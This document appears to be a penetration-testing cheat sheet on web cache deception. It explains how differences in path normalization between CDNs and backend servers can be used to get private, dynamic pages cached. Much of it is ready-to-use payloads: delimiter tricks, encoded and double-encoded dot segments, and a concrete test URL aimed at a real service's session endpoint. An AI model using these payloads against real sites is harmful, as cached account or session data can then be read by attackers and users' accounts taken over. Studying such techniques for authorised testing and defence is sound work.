
# Advanced Cache Deception Methodology

## 1. Exploiting Static Directories Files with Delimiters

This method works when the CDN **normalizes the path**, but the backend server does **not normalize** and treats delimiters as separate endpoints.

### Identify CDN
- **Amazon CloudFront**
- **Microsoft Azure CDN**
- **Imperva CDN**

These typically normalize the path.

### Identify Backend Server
- **Apache**, **Gunicorn**, **Puma**, etc.

These may not normalize the path and honor delimiters.

### Example Payload Structure
```
GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
```

### Test Payloads
```
/myAccount$/%2F..%2Fstatic/any
/myAccount$/..%2Fstatic/any
/myAccount$%2F..%2Fstatic/any
(myAccount$%252F..%252Fstatic/any for double encoding)
```

### Try Adding:
- `.css` or `.js` to endpoints:
  - `/MyAccount/test.css`
- Cache buster:
  - `/MyAccount?test=123`

### How to Find Delimiters
Use valid endpoints and test responses with these known delimiters. If the response is **the same** or reveals inconsistencies, the server is likely parsing delimiters:

1. **Semicolon (;)** - Common in Spring
   - Example: `/account;param=/static/style.css`
2. **Dot (.)** - Behavior seen in Ruby on Rails
   - Example: `/account./static/style.css`
3. **Null Byte (%00)** - Seen in OpenLiteSpeed
   - Example: `/account%00/static/style.css`
4. **Newline (%0A)** - Edge behavior in Nginx
   - Example: `/account%0A/static/style.css`

### Notes:
Use these delimiters on existing cached/static endpoints. If you see the **same resource loaded** or error changes, that confirms delimiter interpretation by the backend.

---

## 2. Exploiting Static Directories & Files with Normalization

This method works when the **CDN does not normalize**, but the **backend does**.

### Identify CDN
- **Cloudflare**
- **Google Cloud CDN**
- **Fastly**

These **do not normalize** paths.

### Identify Backend Server
- **Nginx**, **IIS**, **OpenLiteSpeed**, etc.

These **do normalize** paths.

### Example Payload Structure
```
GET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>
```

### Payloads
```
static/%2F..%2Fapi/auth/session?cachebuster=123
static%2F..%2Fapi/auth/session?cachebuster=123
static/..%2Fapi/auth/session?cachebuster=123
(static%252F..%252Fapi/auth/session?cachebuster=123 for double encoding)
```

Example test link:
```
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```

> Use a browser or proxy to analyze cache behavior (like cache-miss, cache-hit headers) and detect whether responses are being served from CDN or origin.
